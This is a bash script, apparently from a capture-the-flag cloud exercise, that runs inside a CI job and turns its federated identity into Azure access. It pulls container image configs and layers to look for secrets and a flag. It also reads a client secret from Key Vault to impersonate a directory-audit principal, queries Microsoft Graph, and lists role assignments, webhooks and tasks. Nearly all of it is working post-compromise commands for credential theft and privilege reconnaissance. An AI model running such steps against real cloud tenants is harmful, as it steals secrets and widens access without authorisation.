#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ACR="crtblplatprodx3euoz.azurecr.io"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

echo "=== ACR IMAGE MANIFEST INSPECTION ==="
az acr login -n crtblplatprodx3euoz 2>&1 | head -2

# Get ACR access token using Azure AD credentials
ACR_TOK=$(az acr login -n crtblplatprodx3euoz --expose-token --output tsv --query accessToken 2>/dev/null)
echo "ACR token len=${#ACR_TOK}"

# Exchange for Docker registry token
DOCKER_TOK=$(curl -sS "https://$ACR/oauth2/token?service=$ACR&scope=repository:tebamoto-reporting-api:pull" \
  -H "Authorization: Bearer $ACR_TOK" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "Docker registry token len=${#DOCKER_TOK}"

if [ "${#DOCKER_TOK}" -gt 50 ]; then
  echo "=== MANIFEST V2 ==="
  MANIFEST=$(curl -sS "https://$ACR/v2/tebamoto-reporting-api/manifests/latest" \
    -H "Authorization: Bearer $DOCKER_TOK" \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json")
  echo "$MANIFEST" | python3 -c '
import sys,json
d=json.load(sys.stdin)
config=d.get("config",{})
print("config digest:", config.get("digest",""))
print("config size:", config.get("size",""))
layers=d.get("layers",[])
print("num layers:", len(layers))
for l in layers:
    print("  layer:", l.get("digest","")[:30], "size:", l.get("size",""))
' 2>/dev/null

  # Get image config (contains ENV vars, CMD, ENTRYPOINT, etc.)
  CONFIG_DIGEST=$(echo "$MANIFEST" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("config",{}).get("digest",""))' 2>/dev/null)
  echo ""
  echo "=== IMAGE CONFIG (ENV, CMD, ENTRYPOINT) ==="
  curl -sS "https://$ACR/v2/tebamoto-reporting-api/blobs/$CONFIG_DIGEST" \
    -H "Authorization: Bearer $DOCKER_TOK" | python3 -c '
import sys,json
d=json.load(sys.stdin)
cfg=d.get("config",{})
print("Env:", cfg.get("Env",[]))
print("Cmd:", cfg.get("Cmd",[]))
print("Entrypoint:", cfg.get("Entrypoint",[]))
print("WorkingDir:", cfg.get("WorkingDir",""))
print("Labels:", cfg.get("Labels",{}))
hist=d.get("history",[])
print("History:")
for h in hist:
    cmd=h.get("created_by","")
    if "DF26" in cmd or "flag" in cmd.lower() or "secret" in cmd.lower():
        print("  INTERESTING:", cmd[:200])
    else:
        print(" ", cmd[:100])
' 2>/dev/null

  # Try to download the smallest layer and inspect it
  echo ""
  echo "=== DOWNLOAD SMALLEST LAYER ==="
  SMALLEST_DIGEST=$(echo "$MANIFEST" | python3 -c '
import sys,json
d=json.load(sys.stdin)
layers=d.get("layers",[])
if layers:
    sm=min(layers, key=lambda x:x.get("size",999999999))
    print(sm.get("digest",""))
' 2>/dev/null)
  echo "Smallest layer: $SMALLEST_DIGEST"
  if [ -n "$SMALLEST_DIGEST" ]; then
    curl -sS "https://$ACR/v2/tebamoto-reporting-api/blobs/$SMALLEST_DIGEST" \
      -H "Authorization: Bearer $DOCKER_TOK" -o /tmp/layer.tar.gz
    echo "Layer size: $(wc -c < /tmp/layer.tar.gz)"
    tar -tzf /tmp/layer.tar.gz 2>/dev/null | head -30 || tar -tf /tmp/layer.tar.gz 2>/dev/null | head -30
    # Grep for flag in the layer
    tar -xzf /tmp/layer.tar.gz -C /tmp/extracted_layer 2>/dev/null || mkdir -p /tmp/extracted_layer && tar -xzf /tmp/layer.tar.gz -C /tmp/extracted_layer 2>/dev/null
    grep -r "DF26" /tmp/extracted_layer/ 2>/dev/null | head -10
  fi
fi

echo ""
echo "=== DIRECTORY-AUDIT GRAPH API: d2cdf247 LOOKUP ==="
DA_CID="2c34300e-1bc0-41e7-9c1e-8b7571d72c72"
DA_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name directory-audit-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
GT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_CID" --data-urlencode "client_secret=$DA_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

echo "d2cdf247 directoryObject:"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/d2cdf247-9319-40cb-8324-5a005ef538da" \
  -H "Authorization: Bearer $GT" | head -c 1000
echo ""

echo "eeab432e (storefront sami):"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/eeab432e-1bf6-400e-b155-a28ce7cafcdb" \
  -H "Authorization: Bearer $GT" | head -c 600
echo ""

echo "f64d08c7 (reporting uami):"
curl -sS "https://graph.microsoft.com/v1.0/directoryObjects/f64d08c7-fde6-4553-99c8-5bf73666ee8c" \
  -H "Authorization: Bearer $GT" | head -c 600
echo ""

echo "=== SEARCH ALL SERVICE PRINCIPALS FOR d2cdf247 DISPLAY NAME ==="
curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/d2cdf247-9319-40cb-8324-5a005ef538da" \
  -H "Authorization: Bearer $GT" | head -c 1000
echo ""

echo "=== TRY CICD-DEPLOYER ARM TOKEN AT SUBSCRIPTION SCOPE ==="
ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
echo "Role assignments for STOREFRONT SAMI at subscription scope:"
curl -sS "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'eeab432e-1bf6-400e-b155-a28ce7cafcdb'" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err:
    print("ERROR:", err.get("message","")[:200])
else:
    print("Count:", len(vals))
    for r in vals:
        print("  scope="+r["properties"]["scope"])
        print("  role="+r["properties"]["roleDefinitionId"])
' 2>/dev/null

echo ""
echo "=== CHECK ACR WEBHOOKS ==="
az acr webhook list -r crtblplatprodx3euoz -o table 2>/dev/null || echo "no webhooks or no permission"

echo "=== CHECK ACR REPLICATION AND TASKS ==="
az acr task list -r crtblplatprodx3euoz -o table 2>/dev/null || echo "no tasks"

echo "DONE"
